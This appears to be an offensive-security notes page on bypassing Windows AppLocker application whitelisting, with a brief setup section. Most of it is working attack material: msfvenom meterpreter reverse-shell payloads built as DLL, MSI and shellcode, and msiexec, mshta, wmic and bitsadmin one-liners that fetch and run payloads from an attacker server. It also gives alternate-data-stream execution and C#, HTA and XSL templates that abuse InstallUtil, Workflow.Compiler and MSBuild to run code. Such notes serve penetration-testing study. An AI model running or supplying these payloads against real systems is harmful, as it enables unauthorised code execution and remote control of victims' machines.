# AppLocker Bypass

### Enable AppLocker

In Group Policy Editor (gpedit) navigate to _Local Computer Policy_ -> _Computer Configuration_ -> _Windows Settings_ -> _Security Settings_ -> _Application Control Policies_ and select the _AppLocker_

In the Properties menu, enable AppLocker rules for Executables, Windows Installer files, scripts, and packaged apps. DLL's can be enabled as well in Advanced Tab.&#x20;

For each category, select Configured and Apply.&#x20;

Now open one of the categories and right-click. Select "Create Default Rules".&#x20;

Take the time to inspect each ruleset. When you're done run `gpupdate /force` from an admin command prompt or powershell session. Below will be a few defense evasion techniques.&#x20;

### View Blocked Execution

_EventViewer -> Applications and Services Logs_ -> _Microsoft_ -> _Windows_ -> _AppLocker_

### Enumeration

```
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

#### &#x20;Sysinternal Tools

Script to find trusted folders and output the permissions

```
$tools = "C:\SysinternalsSuite"

C:\SysinternalsSuite\accesschk.exe "<USERNAME>" C:\Windows -wus -accepteula | out-file -FilePath C:/users/<USER>/Desktop/permissions.txt

foreach($line in Get-Content  C:/users/<USER>/Desktop/permissions.txt) {
    if($line.StartsWith("RW") -or $line.StartsWith("W"))
    {
    $line.Substring(3) | out-file -FilePath  C:/users/<USER>/Desktop/files.txt -Append
    }
}

foreach($file_path in Get-Content C:/users/<USER>/Desktop/files.txt){
if(Test-Path -Path $file_path -PathType Container)
    {
        cd $tools
        icacls.exe $file_path | out-file -FilePath C:/users/<USER>/Desktop/folder-permissions.txt -Append
    }
}
```

Found interesting folder path. Used in Trusted Folders example below.&#x20;

```
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons 

**NT AUTHORITY\Authenticated Users:(OI)(CI)(F)**
BUILTIN\Users:(OI)(CI)(F)
NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
```

### Trusted Folders

Creating a javascript POC to see if code execution is allowed in a folder. Saved as test.js in folder path mentioned above.&#x20;

```
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

Execute script

```
CMD > .\test.js
```

The same concept applied to DLLs as well

Generate msfvenom dll

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f dll -o msfdll.dll
```

copy to whitelisted folder and run

```
rundll32 C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIconsmsfdll.dll,run
```

### Bypass MSI

Generate payload

```
root@kali: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f msi -o /var/www/html/msi_payload.msi
```

On Victim

```
msiexec /q/i http://192.168.49.115/msi_payload.msi
```

### Alternate Data Stream

Create alternate data stream to readable and writeable file

```
type test.js > "C:\Users\Rick.Sanchez\Random_log.log:test.js"
```

Opening the file will execute primary stream. Using the following command will execute the ADS

```
wscript "C:\Users\Rick.Sanchez\Random_log.log:test.js"
```

#### Getting a Shell with ADS

generate raw payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
```

Create jscript payload with [SuperSharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

```
./SuperSharpShooter.py --dotnetver 4 --payload js --rawscfile rawsc.bin --output test  --stageless
```

create alternate data stream to readable and writeable file (TeamViewer Log)

```
type test.js > "C:\Users\Rick.Sanchez\Random_log.log:test.js"
```

Opening file will execute primary stream. using the following command will execute the ADS

```
wscript "C:\Users\Rick.Sanchez\Random_log.log"
```

### UninstallUtil

A combination of AppLocker and CLM bypass

Note: you must add a reference before compiling.&#x20;

{% hint style="info" %}
```
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
```
{% endhint %}

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //String cmd = "REPLACE ME WITH PAYLOAD"
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\Rick.Sanchez\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    
```

Using Uninstalls to bypass Applocker and bitsadmin to transfer file

```
Attacker > certutil -encode C:\Users\Rick.Sanchez\Bypass.exe bypass.txt
Target > bitsadmin /Transfer myJob http://192.168.0.1/bypass.txt C:\Users\Rick.Sanchez\bypass.txt
Target > certutil -decode C:\Users\Rick.Sanchez\bypass.txt C:\Users\Rick.Sanchez\bypass.exe && del C:\Users\Rick.Sanchez\bypass.txt
Target > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Rick.Sanchez\Bypass.exe
```

### Microsoft.Workflow.Compiler.exe

Payload is C# code as txt file

&#x20;

```
using System;
using System.Diagnostics;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
	    Process process = new Process();
            // Configure the process using the StartInfo properties.
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "powershell.exe -enc <ENCODED PS Payload>";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            process.Start();
            process.WaitForExit();
            Console.WriteLine("I executed!");
    }
}
```

Commands to run

```
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "C:\Users\Rick.Sanchez\test.txt"
$output = "C:\Users\Rick.Sanchez\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output

$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“Rick.Sanchez”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe C:\Users\Rick.Sanchez\run.xml C:\Users\Rick.Sanchez\results.xml
```

### MSBUILD

Using XML Template from here

[https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

Execute Payload

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Rick.Sanchez\Desktop\evil.xml
```

### MSHTA

```
mshta.exe http://192.168.0.1/test.hta
```

Test.hta file on Web Server will open cmd.exe

```html
<html> 
<head> 
<script language="JScript">
<!--- PASTE JSCRIPT PAYLOAD BELOW --->
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
<!--- PASTE JSCRIPT ABOVE--->
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

The MSHTA.exe filepath used is a x64 exe

Generate payload

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.115 LPORT=443 -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
```

SuperSharpShooter

```
./SuperSharpShooter.py --dotnetver 4 --payload js --rawscfile rawsc.bin --output test --stageless
```

Copy Jscript payload created into test.hta template



### WMIC

On Target

```
wmic process get brief /format:"http://192.168.0.1/test.xsl"
```

XSL Template

```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```
